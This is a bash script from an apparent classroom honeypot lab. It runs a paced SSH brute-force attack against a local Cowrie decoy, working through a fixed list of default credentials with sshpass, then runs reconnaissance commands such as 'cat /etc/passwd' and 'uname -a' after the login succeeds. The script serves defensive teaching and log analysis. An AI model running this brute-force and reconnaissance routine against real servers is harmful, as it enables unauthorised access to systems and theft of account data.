#!/usr/bin/env bash
# TRAPDOOR — SSH brute-force scenario
#
# WHAT THIS IS
#   A scripted credential-stuffing attack against the Cowrie decoy. It tries a
#   fixed list of username/password pairs in a fixed order, at a fixed pace, so
#   every student who runs it gets the same transcript.
#
# WHY SCRIPTED AND NOT nmap/hydra
#   Reproducibility beats realism here. A student comparing their log to the
#   slides needs the same events in the same order. Hydra with random timing
#   produces a different lesson every time.
#
# WHAT IT PROVES (checkable claims, not a story)
#   1. An unauthenticated TCP connection to :2222 yields an SSH-2.0 banner.
#   2. A failed login is logged as cowrie.login.failed with the username.
#   3. A successful login is logged as cowrie.login.success.
#   4. Commands run after login are logged as cowrie.command.input.
#   5. Attacker commands do NOT execute on the host. Ever.
#
# Usage: ./scenarios/ssh-bruteforce.sh [target] [port]

set -uo pipefail

# shellcheck disable=SC1091
[[ -f .env ]] && set -a && source .env && set +a

TARGET="${1:-${LAB_BIND_IP:-127.0.0.1}}"
PORT="${2:-${COWRIE_SSH_PORT:-2222}}"

# The fixed credential list. Same order every run, same lesson every time.
# Deliberately includes one password from userdb.txt (root/toor) so the
# scenario shows both a failure and a success in a single transcript —
# students see the moment it breaks without needing two exercises.
CREDS=(
  "root:123456"
  "root:password"
  "admin:admin"
  "admin:123456"
  "ubuntu:ubuntu"
  "root:toor"          # <- succeeds: present in cowrie/etc/userdb.txt
)

say() { printf '\n\033[1m%s\033[0m\n' "$*"; }

command -v sshpass >/dev/null 2>&1 || {
    echo "sshpass is required (apt install sshpass)." >&2
    echo "It is only used to drive the scripted logins; nothing else needs it." >&2
    exit 1
}

say "TRAPDOOR scenario: ssh-bruteforce"
echo "target ${TARGET}:${PORT}"
echo "attempts: ${#CREDS[@]}"
echo
echo "This attacks a decoy. Every login lands in a fake filesystem and nothing"
echo "typed here executes anywhere. That is the point of the exercise."
echo

# --- claim 1: the banner ---------------------------------------------------
say "1. banner"
banner=$(timeout 5 nc -w 3 "$TARGET" "$PORT" </dev/null 2>/dev/null | head -1)
if [[ "$banner" == SSH-2.0-* ]]; then
    echo "   ${banner}"
else
    echo "   FAIL: no SSH banner on ${TARGET}:${PORT}" >&2
    echo "   is the stack up? try: make ps" >&2
    exit 1
fi

# --- claims 2 and 3: the attempts -----------------------------------------
say "2. credential attempts"
SUCCESS=""
for cred in "${CREDS[@]}"; do
    user="${cred%%:*}"
    pass="${cred#*:}"

    # BatchMode off, strict host key off (nobody has ever verified a honeypot's
    # host key and pretending otherwise in a script is theatre), short timeout.
    out=$(SSHPASS="$pass" timeout 10 sshpass -e ssh \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -o PreferredAuthentications=password \
            -o PubkeyAuthentication=no \
            -o ConnectTimeout=5 \
            -o LogLevel=ERROR \
            -p "$PORT" "${user}@${TARGET}" 'true' 2>&1)
    rc=$?

    if [[ $rc -eq 0 ]]; then
        printf '   \033[32mACCEPTED\033[0m  %-8s %s\n' "$user" "$pass"
        SUCCESS="$user:$pass"
        break
    else
        printf '   \033[31mREJECTED\033[0m  %-8s %s\n' "$user" "$pass"
    fi

    # A deliberate pause. A real brute force is loud and fast; this one is paced
    # so the event timestamps in the resulting log are readable when projected
    # on a classroom screen. Note it in the lesson: real attacks do not wait.
    sleep 1
done

# --- claim 4: shell interaction -------------------------------------------
if [[ -n "$SUCCESS" ]]; then
    user="${SUCCESS%%:*}"
    pass="${SUCCESS#*:}"
    say "3. shell session as ${user}"

    # These commands are chosen to be the ones a real attacker types first.
    # Each one is logged individually as cowrie.command.input, which is what
    # makes the transcript useful for teaching.
    COMMANDS='id; uname -a; cat /etc/passwd; ls -la /; echo "TRAPDOOR-CANARY"'

    SSHPASS="$pass" timeout 20 sshpass -e ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        -o ConnectTimeout=5 \
        -o LogLevel=ERROR \
        -p "$PORT" "${user}@${TARGET}" "$COMMANDS" 2>&1 | sed 's/^/   /'

    echo
    echo "   Every line above came from Cowrie's emulated shell. No command ran"
    echo "   on any real system."
else
    say "3. no credential accepted"
    echo "   Set auth_class = UserDB in cowrie/etc/cowrie.cfg and make sure"
    echo "   root/toor is present in cowrie/etc/userdb.txt."
fi

# --- claim 5: what to look for in the events ------------------------------
say "4. what to check in out/events.jsonl"
cat <<'HINT'
   jq -r 'select(.sensor=="cowrie") | [.ts, .event_type, .username] | @tsv' \
      out/events.jsonl | tail -20

   Expect, in order:
     cowrie.session.connect
     cowrie.login.failed      (one per rejected pair)
     cowrie.login.success     (once)
     cowrie.command.input     (id, uname, cat, ls, echo)
     cowrie.session.closed
HINT

say "done"
